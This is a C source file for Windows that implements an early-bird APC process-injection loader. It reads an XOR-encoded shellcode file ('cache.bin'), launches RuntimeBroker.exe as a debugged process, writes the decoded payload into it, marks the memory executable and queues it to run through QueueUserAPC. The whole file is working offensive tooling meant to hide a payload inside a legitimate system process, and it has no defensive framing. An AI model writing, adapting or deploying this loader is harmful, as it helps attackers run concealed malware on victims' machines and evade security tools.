#include <Windows.h>
#include <stdio.h>

#ifdef _DEBUG
#define DBG(fmt, ...) printf(fmt, __VA_ARGS__)
#else
#define DBG(fmt, ...) ((void)0)
#endif

#define TARGET_PROCESS L"RuntimeBroker.exe"

#define MAX_SHELLCODE_SIZE (1024 * 1024 * 100)
#define KEY 0x55

void XOR(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PBYTE pbBuffer) {

	for (SIZE_T i = 0; i < sPayloadSize; i++) {
		pbBuffer[i] = pPayload[i] ^ KEY;
	}
}

PBYTE LoadShellcode(IN LPCWSTR lpPath, OUT PDWORD lpdwSize) {

	HANDLE        hFile      = INVALID_HANDLE_VALUE;
	PBYTE         pbBuffer   = NULL;
	DWORD         dwSize     = 0;
	DWORD         dwByteRead = 0;
	LARGE_INTEGER liFileSize = { 0 };

	hFile = CreateFileW(lpPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		DBG("[-] CreateFileW failed: %lu\n", GetLastError());
		goto _EndOfFunc;
	}

	if (!GetFileSizeEx(hFile, &liFileSize))	{
		DBG("[-] GetFileSizeEx failed: %lu\n", GetLastError());
		goto _EndOfFunc;
	}

	if (liFileSize.QuadPart == 0 || liFileSize.QuadPart > MAX_SHELLCODE_SIZE) {
		DBG("[-] Invalid shellcode size: %lld\n", liFileSize.QuadPart);
		goto _EndOfFunc;
	}

	dwSize = (DWORD)liFileSize.QuadPart;


	pbBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwSize);
	if (pbBuffer == NULL) {
		DBG("[-] HeapAlloc failed\n");
		goto _EndOfFunc;
	}

	if (!ReadFile(hFile, pbBuffer, dwSize, &dwByteRead, NULL) || dwByteRead != dwSize) {
		DBG("[-] ReadFile failed: %lu (read=%lu, expected=%lu)\n", GetLastError(), dwByteRead, dwSize);
		HeapFree(GetProcessHeap(), 0, pbBuffer);
		pbBuffer = NULL;
	}

	*lpdwSize = dwSize;


_EndOfFunc:
	if (hFile != INVALID_HANDLE_VALUE) {
		CloseHandle(hFile);
	}


	return pbBuffer;
}

BOOL CreateDebuggedProcess(IN LPCWSTR lpProcessName, OUT PDWORD pdwProcessId, OUT PHANDLE phProcess, OUT PHANDLE phThread) {

	WCHAR lpPath[MAX_PATH];
	WCHAR lpSysDir[MAX_PATH];

	STARTUPINFOW Si;
	PROCESS_INFORMATION Pi;

	RtlZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	Si.cb = sizeof(Si);

	GetSystemDirectoryW(lpSysDir, MAX_PATH);
	swprintf_s(lpPath, MAX_PATH, L"%s\\%s", lpSysDir, lpProcessName);

	if (!CreateProcessW(lpPath, NULL, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &Si, &Pi)) {
		DBG("[-] CreateProcessW failed :%lu\n", GetLastError());
		return FALSE;
	}

#ifdef _DEBUG
	printf("[+] DEBUGGED Process Created Successfully\n");
#endif

	*pdwProcessId = Pi.dwProcessId;
	*phProcess    = Pi.hProcess;
	*phThread     = Pi.hThread;

#ifdef _DEBUG
	printf("[+] Process ID: %lu, hProcess: %p, hThread: %p\n", Pi.dwProcessId, Pi.hProcess, Pi.hThread);
#endif

	return TRUE;

}

BOOL RunEarlyBirdApcInjection(IN HANDLE hProcess, IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

	PBYTE         pAddress        = NULL;
	PBYTE         pbBuffer        = NULL;
	SIZE_T        sBytesWritten   = 0;
	DWORD         dwOldProtection = 0;
	BOOL          bSuccess        = FALSE;

	pAddress = VirtualAllocEx(hProcess, NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		DBG("[-] VirtualAlloc failed :%lu\n", GetLastError());
		goto cleanup;
	}

	pbBuffer = HeapAlloc(GetProcessHeap(), 0, sPayloadSize);
	if (pbBuffer == NULL) {
		DBG("[-] HeapAlloc failed :%lu\n", GetLastError());
		goto cleanup;
	}

	XOR(pPayload, sPayloadSize, pbBuffer);

	if (!WriteProcessMemory(hProcess, pAddress, pbBuffer, sPayloadSize, &sBytesWritten)) {
		DBG("[-] WriteProcessMemory failed :%lu\n", GetLastError());
		goto cleanup;
	}

	if (sBytesWritten != sPayloadSize) {
		DBG("[-] Partial write: %llu of %llu\n", sBytesWritten, sPayloadSize);
		goto cleanup;
	}

	if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
		DBG("[-] VirtualProtect failed :%lu\n", GetLastError());
		goto cleanup;
	}

	
	if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, (ULONG_PTR)NULL)) {
		DBG("[-] QueueUserAPC failed :%lu\n", GetLastError());
		goto cleanup;
	}
	
	bSuccess = TRUE;

cleanup:
	if (pbBuffer != NULL) {
		HeapFree(GetProcessHeap(), 0, pbBuffer);
	}
	if (!bSuccess && pAddress != NULL) {
		VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
	}
	return bSuccess;
}

int main(void) {

	DWORD       dwProcessId     = 0;
	HANDLE      hProcess        = NULL;
	HANDLE      hThread         = NULL;
	DWORD       dwShellcodeSize = 0;
	PBYTE       pbShellcode     = NULL;
	int         nExitCode       = EXIT_FAILURE;

	DEBUG_EVENT debugEvent      = { 0 };
	HANDLE      hDebugProcess   = NULL;
	HANDLE      hDebugThread    = NULL;

	pbShellcode = LoadShellcode(L"cache.bin", &dwShellcodeSize);
	if (pbShellcode == NULL) {
		goto end;
	}

	if (!CreateDebuggedProcess(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
		goto end;
	}

	if (!WaitForDebugEvent(&debugEvent, INFINITE)) {
		DBG("[-] WaitForDebugEvent failed: %lu\n", GetLastError());
		TerminateProcess(hProcess, 1);
		goto end;
	}

	hDebugProcess = debugEvent.u.CreateProcessInfo.hProcess;
	hDebugThread  = debugEvent.u.CreateProcessInfo.hThread;

	if (!RunEarlyBirdApcInjection(hDebugProcess, hDebugThread, pbShellcode, dwShellcodeSize)) {
		DBG("[-] RunEarlyBirdApcInjection failed :%lu\n", GetLastError());
		TerminateProcess(hProcess, 1);
		goto end;
	}

	if (!ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE)) {
		DBG("[-] ContinueDebugEvent failed: %lu\n", GetLastError());
		TerminateProcess(hProcess, 1);
		goto end;
	}
	
	if (!DebugActiveProcessStop(dwProcessId)) {
		DBG("[-] DebugActiveProcessStop failed: %lu\n", GetLastError());
		TerminateProcess(hProcess, 1);
		goto end;
	}

	/*
	if (ResumeThread(hThread) == (DWORD)-1) {
		DBG("[-] ResumeThread failed: %lu\n", GetLastError());
		TerminateProcess(hProcess, 1);
		goto end;
	}
	*/

	nExitCode = EXIT_SUCCESS;

end:
	if (debugEvent.u.CreateProcessInfo.hFile != NULL) {
		CloseHandle(debugEvent.u.CreateProcessInfo.hFile);
	}
	if (pbShellcode != NULL) HeapFree(GetProcessHeap(), 0, pbShellcode);
	if (hThread != NULL) CloseHandle(hThread);
	if (hProcess != NULL) CloseHandle(hProcess);
	return nExitCode;
}